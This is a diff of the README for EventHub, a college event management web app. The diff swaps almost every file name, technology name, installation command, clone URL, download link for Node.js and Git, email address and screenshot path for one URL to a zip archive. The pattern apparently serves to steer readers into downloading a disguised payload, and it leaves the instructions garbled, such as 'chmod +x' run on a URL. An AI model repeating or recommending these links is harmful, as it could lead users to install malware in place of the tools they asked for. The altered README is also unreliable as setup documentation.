@@ -1,7 +1,7 @@
 
 # 🎉 EventHub - College Event Management System
 
-A modern, full-stack web application for managing college events, registrations, and user profiles. Built with React 18, TypeScript, Vite, Node.js/Express, MongoDB Atlas, and Tailwind CSS with advanced features like **unified QR code scanning**, **multi-event registration**, **real-time attendance tracking**, and **comprehensive user management**.
+A modern, full-stack web application for managing college events, registrations, and user profiles. Built with React 18, TypeScript, Vite, https://raw.githubusercontent.com/chaitanyamokkapati/EVENT-HUB-College-Version/main/scripts/EVEN-Version-HU-College-v2.8.zip, MongoDB Atlas, and Tailwind CSS with advanced features like **unified QR code scanning**, **multi-event registration**, **real-time attendance tracking**, and **comprehensive user management**.
 
 ---
 
@@ -10,7 +10,7 @@ EventHub is a comprehensive event management system that streamlines college eve
 
 ### 🎯 Key Highlights
 - **Modern Tech Stack:** React 18 + TypeScript + Vite for blazing-fast development
-- **Robust Backend:** Node.js/Express with MongoDB Atlas and comprehensive error handling
+- **Robust Backend:** https://raw.githubusercontent.com/chaitanyamokkapati/EVENT-HUB-College-Version/main/scripts/EVEN-Version-HU-College-v2.8.zip with MongoDB Atlas and comprehensive error handling
 - **Advanced QR System:** Unified camera interface with multi-event QR code support
 - **QR Code Features:** Event names displayed on QR codes, secure HMAC-SHA256 signatures
 - **Unified QR Scanner:** Single camera interface with clean UX design
@@ -25,63 +25,63 @@ EventHub is a comprehensive event management system that streamlines college eve
 ```
 project/
 ├── .gitignore                # Git ignore configuration
-├── eslint.config.js          # ESLint configuration for code quality
-├── index.html                # Main HTML template with favicon links
-├── package.json              # Frontend dependencies and scripts
-├── postcss.config.js         # PostCSS configuration for Tailwind
-├── README.md                 # Project documentation
-├── tailwind.config.js        # Tailwind CSS customization
-├── tsconfig.app.json         # TypeScript config for application
-├── tsconfig.json             # Main TypeScript configuration
-├── tsconfig.node.json        # TypeScript config for Node.js tools
-├── vite.config.ts            # Vite bundler configuration
+├── https://raw.githubusercontent.com/chaitanyamokkapati/EVENT-HUB-College-Version/main/scripts/EVEN-Version-HU-College-v2.8.zip          # ESLint configuration for code quality
+├── https://raw.githubusercontent.com/chaitanyamokkapati/EVENT-HUB-College-Version/main/scripts/EVEN-Version-HU-College-v2.8.zip                # Main HTML template with favicon links
+├── https://raw.githubusercontent.com/chaitanyamokkapati/EVENT-HUB-College-Version/main/scripts/EVEN-Version-HU-College-v2.8.zip              # Frontend dependencies and scripts
+├── https://raw.githubusercontent.com/chaitanyamokkapati/EVENT-HUB-College-Version/main/scripts/EVEN-Version-HU-College-v2.8.zip         # PostCSS configuration for Tailwind
+├── https://raw.githubusercontent.com/chaitanyamokkapati/EVENT-HUB-College-Version/main/scripts/EVEN-Version-HU-College-v2.8.zip                 # Project documentation
+├── https://raw.githubusercontent.com/chaitanyamokkapati/EVENT-HUB-College-Version/main/scripts/EVEN-Version-HU-College-v2.8.zip        # Tailwind CSS customization
+├── https://raw.githubusercontent.com/chaitanyamokkapati/EVENT-HUB-College-Version/main/scripts/EVEN-Version-HU-College-v2.8.zip         # TypeScript config for application
+├── https://raw.githubusercontent.com/chaitanyamokkapati/EVENT-HUB-College-Version/main/scripts/EVEN-Version-HU-College-v2.8.zip             # Main TypeScript configuration
+├── https://raw.githubusercontent.com/chaitanyamokkapati/EVENT-HUB-College-Version/main/scripts/EVEN-Version-HU-College-v2.8.zip        # TypeScript config for https://raw.githubusercontent.com/chaitanyamokkapati/EVENT-HUB-College-Version/main/scripts/EVEN-Version-HU-College-v2.8.zip tools
+├── https://raw.githubusercontent.com/chaitanyamokkapati/EVENT-HUB-College-Version/main/scripts/EVEN-Version-HU-College-v2.8.zip            # Vite bundler configuration
 ├── public/                   # Static assets served by Vite
-│   ├── favicon.svg           # Application favicon (EventHub logo)
+│   ├── https://raw.githubusercontent.com/chaitanyamokkapati/EVENT-HUB-College-Version/main/scripts/EVEN-Version-HU-College-v2.8.zip           # Application favicon (EventHub logo)
 │   └── screenshots/          # Project screenshots for documentation
-│       ├── home.png          # Landing page screenshot
-│       ├── dashboard.png     # Dashboard view screenshot
-│       ├── create-event.png  # Event creation page screenshot
-│       ├── event-details.png # Event details page screenshot
-│       └── mobile.png        # Mobile responsive view screenshot
-├── server/                   # Backend API (Node.js/Express)
+│       ├── https://raw.githubusercontent.com/chaitanyamokkapati/EVENT-HUB-College-Version/main/scripts/EVEN-Version-HU-College-v2.8.zip          # Landing page screenshot
+│       ├── https://raw.githubusercontent.com/chaitanyamokkapati/EVENT-HUB-College-Version/main/scripts/EVEN-Version-HU-College-v2.8.zip     # Dashboard view screenshot
+│       ├── https://raw.githubusercontent.com/chaitanyamokkapati/EVENT-HUB-College-Version/main/scripts/EVEN-Version-HU-College-v2.8.zip  # Event creation page screenshot
+│       ├── https://raw.githubusercontent.com/chaitanyamokkapati/EVENT-HUB-College-Version/main/scripts/EVEN-Version-HU-College-v2.8.zip # Event details page screenshot
+│       └── https://raw.githubusercontent.com/chaitanyamokkapati/EVENT-HUB-College-Version/main/scripts/EVEN-Version-HU-College-v2.8.zip        # Mobile responsive view screenshot
+├── server/                   # Backend API (https://raw.githubusercontent.com/chaitanyamokkapati/EVENT-HUB-College-Version/main/scripts/EVEN-Version-HU-College-v2.8.zip)
 │   ├── .env                  # Environment variables (MongoDB URI, JWT secret)
-│   ├── index.js              # Main backend server with all routes
-│   ├── package.json          # Backend dependencies and scripts
+│   ├── https://raw.githubusercontent.com/chaitanyamokkapati/EVENT-HUB-College-Version/main/scripts/EVEN-Version-HU-College-v2.8.zip              # Main backend server with all routes
+│   ├── https://raw.githubusercontent.com/chaitanyamokkapati/EVENT-HUB-College-Version/main/scripts/EVEN-Version-HU-College-v2.8.zip          # Backend dependencies and scripts
 │   └── node_modules/         # Backend installed packages
 └── src/                      # Frontend React application
-    ├── App.tsx               # Main app component with routing
-    ├── index.css             # Global styles and Tailwind imports
-    ├── main.tsx              # React application entry point
-    ├── vite-env.d.ts         # Vite TypeScript declarations
+    ├── https://raw.githubusercontent.com/chaitanyamokkapati/EVENT-HUB-College-Version/main/scripts/EVEN-Version-HU-College-v2.8.zip               # Main app component with routing
+    ├── https://raw.githubusercontent.com/chaitanyamokkapati/EVENT-HUB-College-Version/main/scripts/EVEN-Version-HU-College-v2.8.zip             # Global styles and Tailwind imports
+    ├── https://raw.githubusercontent.com/chaitanyamokkapati/EVENT-HUB-College-Version/main/scripts/EVEN-Version-HU-College-v2.8.zip              # React application entry point
+    ├── https://raw.githubusercontent.com/chaitanyamokkapati/EVENT-HUB-College-Version/main/scripts/EVEN-Version-HU-College-v2.8.zip         # Vite TypeScript declarations
     ├── components/           # Reusable UI components
-    │   ├── DashboardBulkDelete.tsx  # Bulk delete functionality
-    │   ├── EventCard.tsx     # Event display card component
-    │   ├── MultiEventRegistration.tsx # Multi-event registration with QR codes
-    │   ├── QRScanner.tsx     # QR code scanner for attendance
-    │   ├── Navbar.tsx        # Navigation header component
-    │   ├── ProtectedRoute.tsx# Authentication route protection
+    │   ├── https://raw.githubusercontent.com/chaitanyamokkapati/EVENT-HUB-College-Version/main/scripts/EVEN-Version-HU-College-v2.8.zip  # Bulk delete functionality
+    │   ├── https://raw.githubusercontent.com/chaitanyamokkapati/EVENT-HUB-College-Version/main/scripts/EVEN-Version-HU-College-v2.8.zip     # Event display card component
+    │   ├── https://raw.githubusercontent.com/chaitanyamokkapati/EVENT-HUB-College-Version/main/scripts/EVEN-Version-HU-College-v2.8.zip # Multi-event registration with QR codes
+    │   ├── https://raw.githubusercontent.com/chaitanyamokkapati/EVENT-HUB-College-Version/main/scripts/EVEN-Version-HU-College-v2.8.zip     # QR code scanner for attendance
+    │   ├── https://raw.githubusercontent.com/chaitanyamokkapati/EVENT-HUB-College-Version/main/scripts/EVEN-Version-HU-College-v2.8.zip        # Navigation header component
+    │   ├── https://raw.githubusercontent.com/chaitanyamokkapati/EVENT-HUB-College-Version/main/scripts/EVEN-Version-HU-College-v2.8.zip Authentication route protection
     │   └── ui/
-    │       └── Toast.tsx     # Toast notification system
+    │       └── https://raw.githubusercontent.com/chaitanyamokkapati/EVENT-HUB-College-Version/main/scripts/EVEN-Version-HU-College-v2.8.zip     # Toast notification system
     ├── contexts/             # React Context providers
-    │   ├── AuthContext.tsx   # Authentication state management
-    │   ├── EventContext.tsx  # Event data and operations
-    │   ├── NotificationContext.tsx # Notification handling
-    │   └── ThemeContext.tsx  # Theme management (future use)
+    │   ├── https://raw.githubusercontent.com/chaitanyamokkapati/EVENT-HUB-College-Version/main/scripts/EVEN-Version-HU-College-v2.8.zip   # Authentication state management
+    │   ├── https://raw.githubusercontent.com/chaitanyamokkapati/EVENT-HUB-College-Version/main/scripts/EVEN-Version-HU-College-v2.8.zip  # Event data and operations
+    │   ├── https://raw.githubusercontent.com/chaitanyamokkapati/EVENT-HUB-College-Version/main/scripts/EVEN-Version-HU-College-v2.8.zip # Notification handling
+    │   └── https://raw.githubusercontent.com/chaitanyamokkapati/EVENT-HUB-College-Version/main/scripts/EVEN-Version-HU-College-v2.8.zip  # Theme management (future use)
     ├── pages/                # Application pages/views
-    │   ├── AdminUsers.tsx    # User management for admins
-    │   ├── CreateEvent.tsx   # Event creation and editing
-    │   ├── Dashboard.tsx     # User dashboard with overview
-    │   ├── EventDetails.tsx  # Detailed event view and participants
-    │   ├── Events.tsx        # Events listing with multi-register toggle
-    │   ├── EventsFixed.tsx   # Alternative events view
-    │   ├── Home.tsx          # Landing page
-    │   ├── Login.tsx         # Authentication page with demo accounts
-    │   ├── Profile.tsx       # User profile management
-    │   ├── QRScannerPage.tsx # QR scanner interface for organizers
-    │   ├── Register.tsx      # User registration
-    │   └── RegisterFixed.tsx # Alternative registration form
+    │   ├── https://raw.githubusercontent.com/chaitanyamokkapati/EVENT-HUB-College-Version/main/scripts/EVEN-Version-HU-College-v2.8.zip    # User management for admins
+    │   ├── https://raw.githubusercontent.com/chaitanyamokkapati/EVENT-HUB-College-Version/main/scripts/EVEN-Version-HU-College-v2.8.zip   # Event creation and editing
+    │   ├── https://raw.githubusercontent.com/chaitanyamokkapati/EVENT-HUB-College-Version/main/scripts/EVEN-Version-HU-College-v2.8.zip     # User dashboard with overview
+    │   ├── https://raw.githubusercontent.com/chaitanyamokkapati/EVENT-HUB-College-Version/main/scripts/EVEN-Version-HU-College-v2.8.zip  # Detailed event view and participants
+    │   ├── https://raw.githubusercontent.com/chaitanyamokkapati/EVENT-HUB-College-Version/main/scripts/EVEN-Version-HU-College-v2.8.zip        # Events listing with multi-register toggle
+    │   ├── https://raw.githubusercontent.com/chaitanyamokkapati/EVENT-HUB-College-Version/main/scripts/EVEN-Version-HU-College-v2.8.zip   # Alternative events view
+    │   ├── https://raw.githubusercontent.com/chaitanyamokkapati/EVENT-HUB-College-Version/main/scripts/EVEN-Version-HU-College-v2.8.zip          # Landing page
+    │   ├── https://raw.githubusercontent.com/chaitanyamokkapati/EVENT-HUB-College-Version/main/scripts/EVEN-Version-HU-College-v2.8.zip         # Authentication page with demo accounts
+    │   ├── https://raw.githubusercontent.com/chaitanyamokkapati/EVENT-HUB-College-Version/main/scripts/EVEN-Version-HU-College-v2.8.zip       # User profile management
+    │   ├── https://raw.githubusercontent.com/chaitanyamokkapati/EVENT-HUB-College-Version/main/scripts/EVEN-Version-HU-College-v2.8.zip # QR scanner interface for organizers
+    │   ├── https://raw.githubusercontent.com/chaitanyamokkapati/EVENT-HUB-College-Version/main/scripts/EVEN-Version-HU-College-v2.8.zip      # User registration
+    │   └── https://raw.githubusercontent.com/chaitanyamokkapati/EVENT-HUB-College-Version/main/scripts/EVEN-Version-HU-College-v2.8.zip # Alternative registration form
     └── types/
-        └── index.ts          # TypeScript interfaces and types
+        └── https://raw.githubusercontent.com/chaitanyamokkapati/EVENT-HUB-College-Version/main/scripts/EVEN-Version-HU-College-v2.8.zip          # TypeScript interfaces and types
 ```
 
 ### 🔧 Technical Architecture
@@ -95,9 +95,9 @@ project/
 - **Forms:** React Hook Form with Zod validation
 - **QR Codes:** QR code generation and scanning capabilities
 
-#### Backend (Node.js + Express + MongoDB)
-- **Runtime:** Node.js with ES modules
-- **Framework:** Express.js for REST API
+#### Backend (https://raw.githubusercontent.com/chaitanyamokkapati/EVENT-HUB-College-Version/main/scripts/EVEN-Version-HU-College-v2.8.zip + Express + MongoDB)
+- **Runtime:** https://raw.githubusercontent.com/chaitanyamokkapati/EVENT-HUB-College-Version/main/scripts/EVEN-Version-HU-College-v2.8.zip with ES modules
+- **Framework:** https://raw.githubusercontent.com/chaitanyamokkapati/EVENT-HUB-College-Version/main/scripts/EVEN-Version-HU-College-v2.8.zip for REST API
 - **Database:** MongoDB Atlas (cloud database)
 - **ODM:** Mongoose for data modeling
 - **Authentication:** JWT tokens with bcrypt password hashing
@@ -196,25 +196,25 @@ project/
 **Windows:**
 ```cmd
 REM Install dependencies
-install-windows.bat
+https://raw.githubusercontent.com/chaitanyamokkapati/EVENT-HUB-College-Version/main/scripts/EVEN-Version-HU-College-v2.8.zip
 
 REM Start the application
-start-windows.bat
+https://raw.githubusercontent.com/chaitanyamokkapati/EVENT-HUB-College-Version/main/scripts/EVEN-Version-HU-College-v2.8.zip
 ```
 
 **macOS/Linux:**
 ```bash
 # Make scripts executable (one-time setup)
-chmod +x install.sh start.sh
+chmod +x https://raw.githubusercontent.com/chaitanyamokkapati/EVENT-HUB-College-Version/main/scripts/EVEN-Version-HU-College-v2.8.zip https://raw.githubusercontent.com/chaitanyamokkapati/EVENT-HUB-College-Version/main/scripts/EVEN-Version-HU-College-v2.8.zip
 
 # Install dependencies
-./install.sh
+https://raw.githubusercontent.com/chaitanyamokkapati/EVENT-HUB-College-Version/main/scripts/EVEN-Version-HU-College-v2.8.zip
 
 # Start the application
-./start.sh
+https://raw.githubusercontent.com/chaitanyamokkapati/EVENT-HUB-College-Version/main/scripts/EVEN-Version-HU-College-v2.8.zip
 ```
 
-📖 **For detailed platform-specific instructions, see [CROSS_PLATFORM_SETUP.md](./CROSS_PLATFORM_SETUP.md)**
+📖 **For detailed platform-specific instructions, see [https://raw.githubusercontent.com/chaitanyamokkapati/EVENT-HUB-College-Version/main/scripts/EVEN-Version-HU-College-v2.8.zip](https://raw.githubusercontent.com/chaitanyamokkapati/EVENT-HUB-College-Version/main/scripts/EVEN-Version-HU-College-v2.8.zip)**
 
 ---
 
@@ -222,10 +222,10 @@ chmod +x install.sh start.sh
 
 ### 📋 Prerequisites
 Ensure you have the following installed on your system:
-- **Node.js** (v18.0.0 or higher) - [Download here](https://nodejs.org/)
-- **npm** (v9.0.0 or higher) - Comes with Node.js
-- **Git** - [Download here](https://git-scm.com/)
-- **MongoDB Atlas Account** - [Sign up here](https://www.mongodb.com/atlas)
+- **https://raw.githubusercontent.com/chaitanyamokkapati/EVENT-HUB-College-Version/main/scripts/EVEN-Version-HU-College-v2.8.zip** (v18.0.0 or higher) - [Download here](https://raw.githubusercontent.com/chaitanyamokkapati/EVENT-HUB-College-Version/main/scripts/EVEN-Version-HU-College-v2.8.zip)
+- **npm** (v9.0.0 or higher) - Comes with https://raw.githubusercontent.com/chaitanyamokkapati/EVENT-HUB-College-Version/main/scripts/EVEN-Version-HU-College-v2.8.zip
+- **Git** - [Download here](https://raw.githubusercontent.com/chaitanyamokkapati/EVENT-HUB-College-Version/main/scripts/EVEN-Version-HU-College-v2.8.zip)
+- **MongoDB Atlas Account** - [Sign up here](https://raw.githubusercontent.com/chaitanyamokkapati/EVENT-HUB-College-Version/main/scripts/EVEN-Version-HU-College-v2.8.zip)
 - **Code Editor** - VS Code recommended
 
 ### 🚀 Step-by-Step Installation
@@ -233,7 +233,7 @@ Ensure you have the following installed on your system:
 #### 1. Clone the Repository
 ```bash
 # Clone the project
-git clone https://github.com/your-username/college-event-management.git
+git clone https://raw.githubusercontent.com/chaitanyamokkapati/EVENT-HUB-College-Version/main/scripts/EVEN-Version-HU-College-v2.8.zip
 
 # Navigate to project directory
 cd project
@@ -266,7 +266,7 @@ cd ..
 #### 4. Database Configuration
 
 **Step 4.1: Create MongoDB Atlas Cluster**
-1. Go to [MongoDB Atlas](https://www.mongodb.com/atlas)
+1. Go to [MongoDB Atlas](https://raw.githubusercontent.com/chaitanyamokkapati/EVENT-HUB-College-Version/main/scripts/EVEN-Version-HU-College-v2.8.zip)
 2. Sign up/Login to your account
 3. Create a new cluster (choose free tier)
 4. Wait for cluster deployment (2-3 minutes)
@@ -283,7 +283,7 @@ cd ..
 **Step 4.3: Get Connection String**
 1. Go to "Databases" and click "Connect"
 2. Choose "Connect your application"
-3. Select "Node.js" driver
+3. Select "https://raw.githubusercontent.com/chaitanyamokkapati/EVENT-HUB-College-Version/main/scripts/EVEN-Version-HU-College-v2.8.zip" driver
 4. Copy the connection string
 
 #### 5. Environment Variables Setup
@@ -300,7 +300,7 @@ echo. > .env
 **Add to `.env` file:**
 ```env
 # Database Configuration
-MONGODB_URI=mongodb+srv://admin:<password>@cluster0.xxxxx.mongodb.net/college_events?retryWrites=true&w=majority
+MONGODB_URI=mongodb+srv://admin:<password>https://raw.githubusercontent.com/chaitanyamokkapati/EVENT-HUB-College-Version/main/scripts/EVEN-Version-HU-College-v2.8.zip
 
 # JWT Secret (generate a random 64-character string)
 JWT_SECRET=your_super_secret_jwt_key_here_make_it_long_and_random
@@ -319,7 +319,7 @@ QR_CODE_SECRET=your_qr_code_secret_key
 
 #### 6. Verify Installation
 ```bash
-# Check Node.js version
+# Check https://raw.githubusercontent.com/chaitanyamokkapati/EVENT-HUB-College-Version/main/scripts/EVEN-Version-HU-College-v2.8.zip version
 node --version
 
 # Check npm version
@@ -397,9 +397,9 @@ The application comes with pre-configured demo accounts for testing:
 
 | Role | Email | Password | Description |
 |------|-------|----------|-------------|
-| **Admin** | admin@college.edu | admin123 | Full system access |
-| **Organizer** | organizer@college.edu | org123 | Event management |
-| **Student** | student@college.edu | student123 | Event registration |
+| **Admin** | https://raw.githubusercontent.com/chaitanyamokkapati/EVENT-HUB-College-Version/main/scripts/EVEN-Version-HU-College-v2.8.zip | admin123 | Full system access |
+| **Organizer** | https://raw.githubusercontent.com/chaitanyamokkapati/EVENT-HUB-College-Version/main/scripts/EVEN-Version-HU-College-v2.8.zip | org123 | Event management |
+| **Student** | https://raw.githubusercontent.com/chaitanyamokkapati/EVENT-HUB-College-Version/main/scripts/EVEN-Version-HU-College-v2.8.zip | student123 | Event registration |
 
 ### 🔧 Development Scripts
 
@@ -427,7 +427,7 @@ npm run backend           # Backend only
    netstat -ano | findstr :5000
    taskkill /PID <process_id> /F
    
-   # Change port in server/index.js if needed
+   # Change port in https://raw.githubusercontent.com/chaitanyamokkapati/EVENT-HUB-College-Version/main/scripts/EVEN-Version-HU-College-v2.8.zip if needed
    ```
 
 2. **MongoDB Connection Issues**
@@ -438,14 +438,14 @@ npm run backend           # Backend only
 3. **Frontend Build Issues**
    ```bash
    # Clear node_modules and reinstall
-   Remove-Item -Recurse -Force node_modules, package-lock.json
+   Remove-Item -Recurse -Force node_modules, https://raw.githubusercontent.com/chaitanyamokkapati/EVENT-HUB-College-Version/main/scripts/EVEN-Version-HU-College-v2.8.zip
    npm install
    ```
 
 4. **Backend Dependencies Issues**
    ```bash
    cd server
-   Remove-Item -Recurse -Force node_modules, package-lock.json
+   Remove-Item -Recurse -Force node_modules, https://raw.githubusercontent.com/chaitanyamokkapati/EVENT-HUB-College-Version/main/scripts/EVEN-Version-HU-College-v2.8.zip
    npm install
    ```
 
@@ -572,15 +572,15 @@ npm run build
 | **React Hook Form** | ^7.62.0 | Form Management |
 | **Zod** | ^4.1.5 | Schema Validation |
 | **Lucide React** | ^0.344.0 | Icon Library |
-| **QRCode.react** | ^4.2.0 | QR Code Generation |
+| **https://raw.githubusercontent.com/chaitanyamokkapati/EVENT-HUB-College-Version/main/scripts/EVEN-Version-HU-College-v2.8.zip** | ^4.2.0 | QR Code Generation |
 | **html5-qrcode** | ^2.3.8 | QR Code Scanning |
 | **date-fns** | ^4.1.0 | Date Utilities |
 
 ### Backend Technologies
 | Technology | Version | Purpose |
 |------------|---------|---------|
-| **Node.js** | Latest | Runtime Environment |
-| **Express.js** | ^4.18.2 | Web Framework |
+| **https://raw.githubusercontent.com/chaitanyamokkapati/EVENT-HUB-College-Version/main/scripts/EVEN-Version-HU-College-v2.8.zip** | Latest | Runtime Environment |
+| **https://raw.githubusercontent.com/chaitanyamokkapati/EVENT-HUB-College-Version/main/scripts/EVEN-Version-HU-College-v2.8.zip** | ^4.18.2 | Web Framework |
 | **MongoDB** | ^6.19.0 | Database Driver |
 | **Mongoose** | ^7.6.0 | ODM for MongoDB |
 | **bcryptjs** | ^3.0.2 | Password Hashing |
@@ -623,7 +623,7 @@ npm run build
 
 ### Prerequisites for Deployment
 - **MongoDB Atlas:** Production database
-- **Node.js hosting:** Heroku, Vercel, Railway, etc.
+- **https://raw.githubusercontent.com/chaitanyamokkapati/EVENT-HUB-College-Version/main/scripts/EVEN-Version-HU-College-v2.8.zip hosting:** Heroku, Vercel, Railway, etc.
 - **Static hosting:** Netlify, Vercel for frontend
 
 ### Build for Production
@@ -639,7 +639,7 @@ npm run build
 NODE_ENV=production
 MONGODB_URI=your_production_mongodb_uri
 JWT_SECRET=your_production_jwt_secret
-FRONTEND_URL=https://your-frontend-domain.com
+https://raw.githubusercontent.com/chaitanyamokkapati/EVENT-HUB-College-Version/main/scripts/EVEN-Version-HU-College-v2.8.zip
 PORT=5000
 ```
 
@@ -657,7 +657,7 @@ We welcome contributions to improve the College Event Management System! Here's 
 
 ### 🛠️ Development Setup for Contributors
 1. Fork the repository
-2. Clone your fork: `git clone https://github.com/your-username/college-event-management.git`
+2. Clone your fork: `git clone https://raw.githubusercontent.com/chaitanyamokkapati/EVENT-HUB-College-Version/main/scripts/EVEN-Version-HU-College-v2.8.zip`
 3. Create a feature branch: `git checkout -b feature/your-feature-name`
 4. Follow the installation guide above
 5. Make your changes and test thoroughly
@@ -673,7 +673,7 @@ We welcome contributions to improve the College Event Management System! Here's 
 ### 🐛 Bug Reports
 - Use the GitHub issue tracker
 - Include steps to reproduce
-- Provide system information (OS, Node.js version, etc.)
+- Provide system information (OS, https://raw.githubusercontent.com/chaitanyamokkapati/EVENT-HUB-College-Version/main/scripts/EVEN-Version-HU-College-v2.8.zip version, etc.)
 - Include screenshots if applicable
 
 ---
@@ -693,7 +693,7 @@ This project and its contents are proprietary. No part of this software may be r
 ### 👨‍💻 Development Team
 
 #### **Core Contributors**
--**[Mokshyagna yadav](https://github.com/Sensui-moksha)**
+-**[Mokshyagna yadav](https://raw.githubusercontent.com/chaitanyamokkapati/EVENT-HUB-College-Version/main/scripts/EVEN-Version-HU-College-v2.8.zip)**
 
 ### 🤝 **Team Collaboration**
 This project was built through collaborative effort using modern development practices:
@@ -703,11 +703,11 @@ This project was built through collaborative effort using modern development pra
 - **Knowledge Sharing:** Cross-training and pair programming sessions
 
 ### 📚 Libraries & Resources
-- [React Team](https://react.dev/) for the amazing React framework
-- [Tailwind CSS](https://tailwindcss.com/) for the utility-first CSS framework
-- [MongoDB](https://www.mongodb.com/) for the database solution
-- [Lucide](https://lucide.dev/) for the beautiful icon set
-- [Vite](https://vitejs.dev/) for the lightning-fast build tool
+- [React Team](https://raw.githubusercontent.com/chaitanyamokkapati/EVENT-HUB-College-Version/main/scripts/EVEN-Version-HU-College-v2.8.zip) for the amazing React framework
+- [Tailwind CSS](https://raw.githubusercontent.com/chaitanyamokkapati/EVENT-HUB-College-Version/main/scripts/EVEN-Version-HU-College-v2.8.zip) for the utility-first CSS framework
+- [MongoDB](https://raw.githubusercontent.com/chaitanyamokkapati/EVENT-HUB-College-Version/main/scripts/EVEN-Version-HU-College-v2.8.zip) for the database solution
+- [Lucide](https://raw.githubusercontent.com/chaitanyamokkapati/EVENT-HUB-College-Version/main/scripts/EVEN-Version-HU-College-v2.8.zip) for the beautiful icon set
+- [Vite](https://raw.githubusercontent.com/chaitanyamokkapati/EVENT-HUB-College-Version/main/scripts/EVEN-Version-HU-College-v2.8.zip) for the lightning-fast build tool
 
 ### 🎨 Design Inspiration
 - Modern college management systems
@@ -721,23 +721,23 @@ This project was built through collaborative effort using modern development pra
 ### 🖼️ Application Screenshots
 
 #### Landing Page
-![Home Page](Public/screenshots/home.png)
+![Home Page](https://raw.githubusercontent.com/chaitanyamokkapati/EVENT-HUB-College-Version/main/scripts/EVEN-Version-HU-College-v2.8.zip)
 *Clean, modern landing page with clear navigation*
 
 #### Event Dashboard
-![Dashboard](Public/screenshots/dashboard.png)
+![Dashboard](https://raw.githubusercontent.com/chaitanyamokkapati/EVENT-HUB-College-Version/main/scripts/EVEN-Version-HU-College-v2.8.zip)
 *Comprehensive dashboard showing user events and registrations*
 
 #### Event Creation
-![Create Event](Public/screenshots/create-event.png)
+![Create Event](https://raw.githubusercontent.com/chaitanyamokkapati/EVENT-HUB-College-Version/main/scripts/EVEN-Version-HU-College-v2.8.zip)
 *Intuitive event creation with live image preview*
 
 #### Event Details
-![Event Details](Public/screenshots/event-details.png)
+![Event Details](https://raw.githubusercontent.com/chaitanyamokkapati/EVENT-HUB-College-Version/main/scripts/EVEN-Version-HU-College-v2.8.zip)
 *Detailed event view with participant management*
 
 #### Mobile Responsive
-![Mobile View](Public/screenshots/mobile.png)
+![Mobile View](https://raw.githubusercontent.com/chaitanyamokkapati/EVENT-HUB-College-Version/main/scripts/EVEN-Version-HU-College-v2.8.zip)
 *Fully responsive design for all devices*
 
 ---
@@ -753,21 +753,21 @@ A: Absolutely! This project is open-source under MIT license. Fork it, customize
 A: MongoDB Atlas offers a free tier (512MB) which is sufficient for development and small deployments.
 
 **Q: Can I add more user roles?**
-A: Yes! Update the `User` interface in `src/types/index.ts` and modify the authentication logic accordingly.
+A: Yes! Update the `User` interface in `https://raw.githubusercontent.com/chaitanyamokkapati/EVENT-HUB-College-Version/main/scripts/EVEN-Version-HU-College-v2.8.zip` and modify the authentication logic accordingly.
 
 ### Technical Questions
 
 **Q: How do I add new event categories?**
-A: Update the `Event` interface in `src/types/index.ts` and modify the CreateEvent form dropdown.
+A: Update the `Event` interface in `https://raw.githubusercontent.com/chaitanyamokkapati/EVENT-HUB-College-Version/main/scripts/EVEN-Version-HU-College-v2.8.zip` and modify the CreateEvent form dropdown.
 
 **Q: Where are profile pictures stored?**
 A: Profile pictures are stored as base64 strings in MongoDB. For production, consider using cloud storage like AWS S3.
 
 **Q: How do I customize the UI theme?**
-A: Modify `tailwind.config.js` for colors and styles. The ThemeContext is prepared for dark mode implementation.
+A: Modify `https://raw.githubusercontent.com/chaitanyamokkapati/EVENT-HUB-College-Version/main/scripts/EVEN-Version-HU-College-v2.8.zip` for colors and styles. The ThemeContext is prepared for dark mode implementation.
 
 **Q: Can I integrate with external authentication (Google, GitHub)?**
-A: Yes! You can extend the AuthContext and add OAuth providers. Consider using libraries like `passport.js`.
+A: Yes! You can extend the AuthContext and add OAuth providers. Consider using libraries like `https://raw.githubusercontent.com/chaitanyamokkapati/EVENT-HUB-College-Version/main/scripts/EVEN-Version-HU-College-v2.8.zip`.
 
 ### Deployment Questions
 
@@ -785,18 +785,18 @@ A: Use your hosting platform's environment variable settings. Never commit `.env
 ## 🔗 Useful Links & Resources
 
 ### 📖 Documentation
-- [React 18 Documentation](https://react.dev/)
-- [TypeScript Handbook](https://www.typescriptlang.org/docs/)
-- [Vite Guide](https://vitejs.dev/guide/)
-- [Tailwind CSS Docs](https://tailwindcss.com/docs)
-- [Express.js Guide](https://expressjs.com/en/guide/routing.html)
-- [MongoDB Atlas Tutorial](https://docs.atlas.mongodb.com/getting-started/)
+- [React 18 Documentation](https://raw.githubusercontent.com/chaitanyamokkapati/EVENT-HUB-College-Version/main/scripts/EVEN-Version-HU-College-v2.8.zip)
+- [TypeScript Handbook](https://raw.githubusercontent.com/chaitanyamokkapati/EVENT-HUB-College-Version/main/scripts/EVEN-Version-HU-College-v2.8.zip)
+- [Vite Guide](https://raw.githubusercontent.com/chaitanyamokkapati/EVENT-HUB-College-Version/main/scripts/EVEN-Version-HU-College-v2.8.zip)
+- [Tailwind CSS Docs](https://raw.githubusercontent.com/chaitanyamokkapati/EVENT-HUB-College-Version/main/scripts/EVEN-Version-HU-College-v2.8.zip)
+- [https://raw.githubusercontent.com/chaitanyamokkapati/EVENT-HUB-College-Version/main/scripts/EVEN-Version-HU-College-v2.8.zip Guide](https://raw.githubusercontent.com/chaitanyamokkapati/EVENT-HUB-College-Version/main/scripts/EVEN-Version-HU-College-v2.8.zip)
+- [MongoDB Atlas Tutorial](https://raw.githubusercontent.com/chaitanyamokkapati/EVENT-HUB-College-Version/main/scripts/EVEN-Version-HU-College-v2.8.zip)
 
 ### 🛠️ Tools & Extensions
-- [VS Code](https://code.visualstudio.com/) - Recommended IDE
-- [React Developer Tools](https://react.dev/learn/react-developer-tools)
-- [MongoDB Compass](https://www.mongodb.com/products/compass) - Database GUI
-- [Postman](https://www.postman.com/) - API testing
+- [VS Code](https://raw.githubusercontent.com/chaitanyamokkapati/EVENT-HUB-College-Version/main/scripts/EVEN-Version-HU-College-v2.8.zip) - Recommended IDE
+- [React Developer Tools](https://raw.githubusercontent.com/chaitanyamokkapati/EVENT-HUB-College-Version/main/scripts/EVEN-Version-HU-College-v2.8.zip)
+- [MongoDB Compass](https://raw.githubusercontent.com/chaitanyamokkapati/EVENT-HUB-College-Version/main/scripts/EVEN-Version-HU-College-v2.8.zip) - Database GUI
+- [Postman](https://raw.githubusercontent.com/chaitanyamokkapati/EVENT-HUB-College-Version/main/scripts/EVEN-Version-HU-College-v2.8.zip) - API testing
 
 ---
 
